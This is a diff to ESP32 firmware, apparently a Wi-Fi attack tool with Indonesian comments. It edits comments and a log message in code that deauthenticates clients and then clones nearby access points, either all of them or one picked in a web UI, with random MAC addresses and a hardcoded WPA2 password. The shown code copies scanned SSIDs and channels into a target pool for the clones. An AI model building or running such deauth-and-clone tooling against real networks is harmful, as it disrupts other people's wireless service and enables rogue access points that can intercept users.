@@ -3,9 +3,9 @@
  * @author SameerAlSahab (sameeralsahab54@gmail.com)
  * @date 8-5-2026
  * 
- * @brief Modifikasi Dual Kontrol Otomatis (Stabil & Bebas Lock Web UI):
+ * @brief Modifikasi Dual Kontrol Otomatis Akurat (Bebas Lock Web UI):
  *        - BEACON SPAM (Massal): Deauth 10 detik -> Kloning SEMUA AP sekitar -> MAC Acak -> Durasi Web UI.
- *        - SUPER CLONE (Tunggal): Deauth 5 detik -> Kloning HANYA 1 Target Terpilih -> MAC Acak -> Durasi Web UI.
+ *        - SUPER CLONE (Tunggal): Deauth 5 detik -> Kloning HANYA 1 Target Terpilih di Web UI -> MAC Acak -> Durasi Web UI.
  *        Keduanya menggunakan keamanan WPA2, sandi kustom fX9!mK4$zQ2#vW9&tP7@jL2xN5*bV8%c.
  */
 
@@ -155,15 +155,16 @@ void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
     uint32_t input_seconds = (count > 0) ? (count * 60) : 300; 
     beacon_max_ticks = (input_seconds * 10); 
 
-    // PERLINDUNGAN MANAJEMEN AP: Blok konfigurasi fisik WIFI_IF_AP dihapus total dari sini 
+    // PERLINDUNGAN MANAJEMEN AP: Blok konfigurasi fisik WIFI_IF_AP tetap dikosongkan dari sini
     // agar setelan SSID/Password panel kontrol 192.168.4.1 bebas diganti dan tidak disconnect.
 
     if (mode == BEACON_MODE_GARBAGE) {
         // ─── SKENARIO 2: MODE SUPER CLONE ───
         deauth_max_ticks = 50; // Kunci Deauth 5 detik (50 Ticks)
         total_targets = 1;     // Paksa target menjadi 1 tunggal saja
-        ESP_LOGI(TAG, "Menjalankan SUPER CLONE (1 Target, Deauth 5 Detik)");
+        ESP_LOGI(TAG, "Menjalankan SUPER CLONE (1 Target Terpilih, Deauth 5 Detik)");
 
+        // Mengambil data AP target tunggal ke-1 yang Anda klik/pilih di halaman Web UI
         const wifi_ap_record_t *record = ap_scanner_get_record(0);
         if (record != NULL) {
             memcpy(target_pool[0].ssid, record->ssid, 32);
@@ -171,7 +172,7 @@ void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
             target_pool[0].ssid_len = strlen((char *)target_pool[0].ssid);
             target_pool[0].channel = record->primary;
             
-            // Logika MAC Acak Unik untuk target tunggal
+            // Logika MAC Acak Unik untuk target tunggal super clone
             for (int j = 0; j < 6; j++) target_pool[0].bssid[j] = esp_random() & 0xFF;
             target_pool[0].bssid[0] = (target_pool[0].bssid[0] & 0xFE) | 0x02; 
         }
@@ -199,7 +200,7 @@ void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
                     target_pool[i].ssid_len = strlen((char *)target_pool[i].ssid);
                     target_pool[i].channel = record->primary;
                     
-                    // Logika MAC Acak Unik massal untuk setiap AP kloningan
+                    // Logika MAC Acak Unik massal untuk setiap AP kloningan massal
                     for (int j = 0; j < 6; j++) target_pool[i].bssid[j] = esp_random() & 0xFF;
                     target_pool[i].bssid[0] = (target_pool[i].bssid[0] & 0xFE) | 0x02; 
                 }
